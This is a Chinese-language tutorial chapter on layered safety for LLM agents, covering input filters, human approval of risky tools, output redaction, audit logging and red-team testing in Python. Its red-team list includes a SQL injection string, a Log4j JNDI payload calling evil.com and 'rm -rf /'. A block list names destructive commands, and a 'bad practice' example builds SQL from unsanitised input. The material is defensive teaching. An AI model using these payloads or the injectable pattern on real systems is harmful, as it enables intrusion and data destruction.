# Item 31: Design Safety as Layered Defense, Not a Single Check

## 问题

你只做了一层安全检查，以为就够了：

```python
# 坏做法：只有一层检查
class UnsafeAgent:
    def run(self, user_input: str):
        if "删除" in user_input:
            return "禁止"
        # 如果绕过这个检查，就完全暴露了
        return self.execute_dangerous_tool(user_input)
```

或者你根本没有安全意识：

```python
# 危险：没有安全检查
@tool
def delete_database(table_name: str):
    """删除数据库表"""
    db.execute(f"DROP TABLE {table_name}")
    return "Deleted"

# 任何用户输入都能调用这个工具！
```

## 深入解释

**安全不是单一检查，而是多层护盾**：

```
┌─────────────────────────────────────────────────────────────┐
│                    分层安全模型                              │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  用户输入                                                    │
│      ↓                                                       │
│  ┌─────────────────────────────────────────────────────┐    │
│  │  Layer 1: 输入过滤（Input Validation）                 │    │
│  │  - 敏感词过滤                                        │    │
│  │  - 注入检测                                          │    │
│  │  - 速率限制                                          │    │
│  └─────────────────────────────────────────────────────┘    │
│      ↓                                                       │
│  ┌─────────────────────────────────────────────────────┐    │
│  │  Layer 2: 工具审批（Tool Approval）                    │    │
│  │  - 高风险工具需要人工审批                              │    │
│  │  - 权限分级                                          │    │
│  │  - 操作审计                                          │    │
│  └─────────────────────────────────────────────────────┘    │
│      ↓                                                       │
│  ┌─────────────────────────────────────────────────────┐    │
│  │  Layer 3: 输出审核（Output Filtering）                  │    │
│  │  - 有害内容过滤                                       │    │
│  │  - 敏感信息脱敏                                       │    │
│  │  - 合规检查                                          │    │
│  └─────────────────────────────────────────────────────┘    │
│      ↓                                                       │
│  最终响应                                                    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**心智模型**：安全就像现实世界的安保系统——机场有层层安检（金属探测器、X光、身份核验），单一检查被突破不等于整个系统被突破。

## 推荐做法

### Layer 1: 输入过滤 Middleware

```python
from agent_framework import Middleware

class InputSafetyMiddleware(Middleware):
    """输入安全检查"""

    BLOCKED_PATTERNS = [
        "删除",
        "drop table",
        "rm -rf",
        "format:",
        "--",
    ]

    def __init__(self, blocked_patterns: list[str] = None):
        self.blocked_patterns = blocked_patterns or self.BLOCKED_PATTERNS

    async def on_input(self, input_data, context):
        """在 Agent 处理前检查输入"""
        text = str(input_data)

        for pattern in self.blocked_patterns:
            if pattern.lower() in text.lower():
                raise ValueError(f"输入包含敏感内容: {pattern}")

        return input_data  # 通过检查，继续


class RateLimitMiddleware(Middleware):
    """速率限制"""

    def __init__(self, max_requests_per_minute: int = 60):
        self.max_requests = max_requests_per_minute
        self.requests = []

    async def on_input(self, input_data, context):
        now = time.time()
        self.requests = [t for t in self.requests if now - t < 60]

        if len(self.requests) >= self.max_requests:
            raise ValueError("请求过于频繁，请稍后重试")

        self.requests.append(now)
        return input_data
```

### Layer 2: 工具审批

```python
from agent_framework import tool, ToolApproval

# 高风险工具需要审批
@tool
def delete_database(table_name: str) -> str:
    """删除数据库表（高风险操作）"""
    # 不直接执行，而是返回待审批状态
    return f"DELETE_REQUEST_PENDING: {table_name}"

# 配置工具审批
class HumanApprovalMiddleware(Middleware):
    """人工审批中间件"""

    def __init__(self, approver):
        self.approver = approver  # 可以是 email、Slack webhook 等

    async def on_tool_call(self, tool_name: str, args: dict, context):
        high_risk_tools = ["delete_database", "send_email", "transfer_money"]

        if tool_name in high_risk_tools:
            # 发送审批请求
            approval_id = self.approver.request_approval(
                tool=tool_name,
                args=args,
                user=context.user_id,
            )

            # 等待审批（可以是异步的）
            if not self.approver.wait_for_approval(approval_id, timeout=300):
                raise ValueError(f"工具 {tool_name} 审批超时或被拒绝")

        return args  # 返回参数继续执行
```

### Layer 3: 输出审核

```python
class OutputSafetyMiddleware(Middleware):
    """输出安全检查"""

    SENSITIVE_PATTERNS = [
        r"\d{15,18}",  # 身份证号
        r"\d{16,19}",  # 信用卡号
        r"sk-[a-zA-Z0-9]{20,}",  # API Key
    ]

    def __init__(self, patterns: list[str] = None):
        self.patterns = patterns or self.SENSITIVE_PATTERNS

    async def on_output(self, output, context):
        """在输出返回用户前检查"""
        text = str(output)

        for pattern in self.patterns:
            import re
            if re.search(pattern, text):
                # 脱敏处理
                text = re.sub(pattern, "[脱敏]", text)

        return text


class ContentFilterMiddleware(Middleware):
    """内容过滤"""

    HARMFUL_KEYWORDS = [
        "如何制造炸弹",
        "怎么入侵别人电脑",
        # ... 更多敏感词
    ]

    async def on_output(self, output, context):
        text = str(output)

        for keyword in self.HARMFUL_KEYWORDS:
            if keyword in text:
                return "抱歉，我无法回答这个问题。"

        return output
```

### 完整分层安全 Agent

```python
# 组合多层安全
agent = Agent(
    client=client,
    instructions="你是一个有帮助的助手。",
    tools=[delete_database, send_email, calculate],
    middleware=[
        InputSafetyMiddleware(),           # Layer 1
        RateLimitMiddleware(max_requests=60),  # Layer 1
        HumanApprovalMiddleware(approver),  # Layer 2
        OutputSafetyMiddleware(),          # Layer 3
        ContentFilterMiddleware(),          # Layer 3
    ],
)
```

## 好 vs 坏对比

```python
# 坏做法：只有一层检查
@tool
def dangerous_tool(input):
    if "bad" in input:  # 一层，容易绕过
        return "blocked"
    execute_dangerous_operation(input)

# 好做法：多层防御
@tool
def dangerous_tool(input):
    # Layer 1: 工具级别检查
    if contains_dangerous_pattern(input):
        return "blocked at tool level"

# Layer 2: Middleware 检查
# Layer 3: 审批流程检查
```

## 扩展讨论

### 安全层级设计

| 层级 | 机制 | 作用 |
|------|------|------|
| **Layer 0** | Client 基础验证 | API Key、认证 |
| **Layer 1** | 输入验证 | 注入、格式、长度 |
| **Layer 2** | 业务规则 | 权限、审批 |
| **Layer 3** | 输出验证 | 脱敏、过滤 |
| **Layer 4** | 审计 | 日志、追溯 |

### 审计日志

```python
class AuditLogger:
    """安全审计日志"""

    def log_tool_call(self, tool_name: str, args: dict, user: str, approved: bool):
        entry = {
            "timestamp": datetime.now().isoformat(),
            "event": "tool_call",
            "tool": tool_name,
            "args": args,
            "user": user,
            "approved": approved,
        }
        # 写入不可篡改的审计日志（如 append-only 文件、数据库）
        self.audit_log.append(entry)

    def log_input_blocked(self, input_text: str, reason: str, user: str):
        entry = {
            "timestamp": datetime.now().isoformat(),
            "event": "input_blocked",
            "input": input_text[:200],  # 只记录前200字符
            "reason": reason,
            "user": user,
        }
        self.audit_log.append(entry)

    def log_output_filtered(self, original: str, reason: str):
        entry = {
            "timestamp": datetime.now().isoformat(),
            "event": "output_filtered",
            "original": original[:200],
            "reason": reason,
        }
        self.audit_log.append(entry)
```

### 人工介入机制

```python
class SlackApprover:
    """Slack 审批"""

    def __init__(self, webhook_url: str):
        self.webhook_url = webhook_url

    def request_approval(self, tool: str, args: dict, user: str) -> str:
        import uuid
        approval_id = str(uuid.uuid4())

        message = {
            "text": f"工具执行审批请求",
            "blocks": [
                {"type": "section", "text": {"type": "mrkdwn", "text": f"*工具*: {tool}"}},
                {"type": "section", "text": {"type": "mrkdwn", "text": f"*申请人*: {user}"}},
                {"type": "section", "text": {"type": "mrkdwn", "text": f"*参数*: {args}"}},
                {"type": "actions", "elements": [
                    {"type": "button", "text": {"type": "plain_text", "text": "批准"}, "action_id": f"approve_{approval_id}"},
                    {"type": "button", "text": {"type": "plain_text", "text": "拒绝"}, "action_id": f"reject_{approval_id}"},
                ]},
            ]
        }

        requests.post(self.webhook_url, json=message)
        return approval_id
```

### 红队测试

```python
# 定期进行安全测试
class RedTeamTester:
    ATTACK_PATTERNS = [
        "'; DROP TABLE users;--",  # SQL 注入
        "${jndi:ldap://evil.com/a}",  # Log4j
        "rm -rf /",  # 系统命令注入
        # ... 更多攻击模式
    ]

    async def run_tests(self, agent):
        for pattern in self.ATTACK_PATTERNS:
            try:
                result = await agent.run(pattern)
                if not self.is_safe_response(result):
                    print(f"VULNERABILITY: {pattern} bypassed security")
            except Exception as e:
                print(f"BLOCKED: {pattern} - {e}")
```

## Things to Remember

- **安全必须分层**，单一检查不可靠
- **Layer 1（输入）**：过滤、验证、速率限制
- **Layer 2（工具）**：审批、权限、隔离
- **Layer 3（输出）**：脱敏、过滤、合规
- **每层都可能失败**，层与层之间要互补
- **高风险工具必须人工审批**，不能自动执行
- **审计日志**用于事后分析，必须不可篡改
- **不要信任任何用户输入**，即使通过了前面的检查
- **失败策略**：安全检查失败时应该 fail-close（默认拒绝）而非 fail-open（默认通过）
- **人工介入是最高权限的安全护盾**
